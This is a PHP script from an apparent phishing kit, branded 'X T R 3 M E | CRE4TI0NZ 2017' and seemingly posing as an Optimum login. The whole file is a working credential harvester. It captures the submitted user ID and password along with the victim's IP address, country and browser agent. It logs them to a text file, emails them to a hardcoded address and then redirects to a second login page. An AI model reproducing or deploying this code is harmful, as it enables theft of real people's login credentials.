<?php


$userinfo="johnloganj8@gmail.com"; // put your email

$id .= $_POST['id'];
$password .= $_POST['password'];


if (getenv(HTTP_X_FORWARDED_FOR)){
$ip = getenv(HTTP_X_FORWARDED_FOR); } else {
$ip = getenv(REMOTE_ADDR); }
$date = date("d M, Y");
$time = date("g:i a"); 
$date = trim("Date : ".$date.", Time : ".$time);
$COUNTRY = $J7->geoplugin_countryName ;
$useragent = $_SERVER['HTTP_USER_AGENT']; 

$data = "======[[ X T R 3 M E | CRE4TI0NZ 2017 ]]======\n\nUser ID : $id\nPassword : $password\n\n======[ Browser Details ]======\nUser IP : $ip\nCountry: $COUNTRY\n$date\nAgent : $useragent \n";

$file = fopen("xNlogz/xnl.txt","a"); 
fwrite($file,$message); 

# -=-=-=- MIME BOUNDARY
$mime_boundary = "----MSA ----".md5(time());
# -=-=-=- MAIL HEADERS
$headers = "MIME-Version: 1.0" . "\r\n";
$headers .= "Content-type:text/html;charset=iso-8859-1" . "\r\n";
$headers = "From: Optimum<optimum@t3ch.net>";
$subject = "New Log From $ip";
mail($userinfo,$subject,$data);

$encrypt=  base64_encode($data);
header("Location: login2.php");



?>